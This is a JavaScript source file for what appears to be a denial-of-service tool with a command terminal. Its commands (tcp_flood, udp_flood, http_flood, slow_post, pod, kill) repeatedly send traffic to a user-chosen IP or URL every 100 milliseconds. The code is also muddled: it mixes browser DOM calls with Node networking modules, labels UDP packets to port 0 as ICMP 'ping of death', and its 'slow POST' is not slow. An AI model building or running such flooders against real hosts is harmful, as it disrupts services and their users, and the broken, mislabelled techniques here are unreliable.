const net = require('net');
const http = require('http');
const https = require('https');
const dgram = require('dgram');
const fs = require('fs');

let attackRunning = false;

function executeCommand(command) {
    const parts = command.trim().toLowerCase().split(' ');
    const terminalOutput = document.getElementById('terminal-output');
    

    if (parts[0] === 'help') {
        terminalOutput.innerHTML += `<p>Available commands:<br>
        - tcp_flood [ip] [port]<br>
        - udp_flood [ip] [port]<br>
        - http_flood [url]<br>
        - slow_post [url]<br>
        - pod [ip]<br>
        - kill [url]<br>
        - clear</p>`;
    } else if (parts[0] === 'clear') {
        terminalOutput.innerHTML = '';
        attackRunning = false;
        terminalOutput.innerHTML += `<p>Attack stopped and terminal cleared.</p>`;
    } else if (parts[0] === 'tcp_flood' && parts.length === 3) {
        const ip = parts[1];
        const port = parts[2];
        terminalOutput.innerHTML += `<p>Launching TCP Flood on ${ip}:${port}</p>`;
        launchTCPFlood(ip, port);
    } else if (parts[0] === 'udp_flood' && parts.length === 3) {
        const ip = parts[1];
        const port = parts[2];
        terminalOutput.innerHTML += `<p>Launching UDP Flood on ${ip}:${port}</p>`;
        launchUDPFlood(ip, port);
    } else if (parts[0] === 'http_flood' && parts.length === 2) {
        const url = parts[1];
        terminalOutput.innerHTML += `<p>Launching HTTP Flood on ${url}</p>`;
        launchHTTPFlood(url);
    } else if (parts[0] === 'slow_post' && parts.length === 2) {
        const url = parts[1];
        terminalOutput.innerHTML += `<p>Launching Slow POST on ${url}</p>`;
        launchSlowPOST(url);
    } else if (parts[0] === 'pod' && parts.length === 2) {
        const ip = parts[1];
        terminalOutput.innerHTML += `<p>Launching POD on ${ip}</p>`;
        launchPOD(ip);
    } else if (parts[0] === 'kill' && parts.length === 2) {
        const url = parts[1];
        terminalOutput.innerHTML += `<p>Launching KILL on ${url}</p>`;
        launchKILL(url);
    } else {
        terminalOutput.innerHTML += `<p>Unknown command. Type 'help' for a list of commands.</p>`;
    }
}

function handleKeyPress(event) {
    if (event.key === 'Enter') {
        executeCommand(event.target.value);
        event.target.value = '';
    }
}

function clearTerminal() {
    const terminalOutput = document.getElementById('terminal-output');
    terminalOutput.innerHTML = '';
    attackRunning = false;
    terminalOutput.innerHTML += `<p>Attack stopped and terminal cleared.</p>`;
}

function launchTCPFlood(ip, port) {
    if (attackRunning) return;
    attackRunning = true;
    const client = new net.Socket();
    client.connect(port, ip, () => {
        console.log('Connected to TCP server');
        client.write('Hello, server!');
    });
    client.on('data', (data) => {
        console.log('Received: ' + data);
    });
    client.on('close', () => {
        console.log('Connection closed');
    });
    client.on('error', (err) => {
        console.error('TCP Flood error:', err);
    });
    setInterval(() => {
        client.write('Hello, server!');
    }, 100);
}

function launchUDPFlood(ip, port) {
    if (attackRunning) return;
    attackRunning = true;
    const message = Buffer.from('Hello, UDP server!');
    const client = dgram.createSocket('udp4');
    setInterval(() => {
        client.send(message, 0, message.length, port, ip, (err) => {
            if (err) {
                console.error('Error sending UDP message:', err);
            } else {
                console.log('UDP message sent');
            }
        });
    }, 100);
}

function launchHTTPFlood(url) {
    if (attackRunning) return;
    attackRunning = true;
    const options = {
        hostname: new URL(url).hostname,
        port: 80,
        path: new URL(url).pathname,
        method: 'GET'
    };
    setInterval(() => {
        const req = http.request(options, (res) => {
            console.log(`STATUS: ${res.statusCode}`);
            console.log(`HEADERS: ${JSON.stringify(res.headers)}`);
            res.setEncoding('utf8');
            res.on('data', (chunk) => {
                console.log(`BODY: ${chunk}`);
            });
            res.on('end', () => {
                console.log('No more data in response.');
            });
        });
        req.on('error', (e) => {
            console.error(`problem with request: ${e.message}`);
        });
        req.end();
    }, 100);
}

function launchSlowPOST(url) {
    if (attackRunning) return;
    attackRunning = true;
    const options = {
        hostname: new URL(url).hostname,
        port: 80,
        path: new URL(url).pathname,
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': 1024
        }
    };
    setInterval(() => {
        const req = http.request(options, (res) => {
            console.log(`STATUS: ${res.statusCode}`);
            console.log(`HEADERS: ${JSON.stringify(res.headers)}`);
            res.setEncoding('utf8');
            res.on('data', (chunk) => {
                console.log(`BODY: ${chunk}`);
            });
            res.on('end', () => {
                console.log('No more data in response.');
            });
        });
        req.on('error', (e) => {
            console.error(`problem with request: ${e.message}`);
        });
        req.write('This is a slow POST request');
        req.end();
    }, 100);
}

function launchPOD(ip) {
    if (attackRunning) return;
    attackRunning = true;
    const message = Buffer.from('Hello, ICMP server!');
    const client = dgram.createSocket('udp4');
    setInterval(() => {
        client.send(message, 0, message.length, 0, ip, (err) => {
            if (err) {
                console.error('Error sending ICMP message:', err);
            } else {
                console.log('ICMP message sent');
            }
        });
    }, 100);
}

function launchKILL(url) {
    if (attackRunning) return;
    attackRunning = true;
    const options = {
        hostname: new URL(url).hostname,
        port: 80,
        path: new URL(url).pathname,
        method: 'GET'
    };
    setInterval(() => {
        const req = http.request(options, (res) => {
            console.log(`STATUS: ${res.statusCode}`);
            console.log(`HEADERS: ${JSON.stringify(res.headers)}`);
            res.setEncoding('utf8');
            res.on('data', (chunk) => {
                console.log(`BODY: ${chunk}`);
            });
            res.on('end', () => {
                console.log('No more data in response.');
            });
        });
        req.on('error', (e) => {
            console.error(`problem with request: ${e.message}`);
        });
        req.end();
    }, 100);
}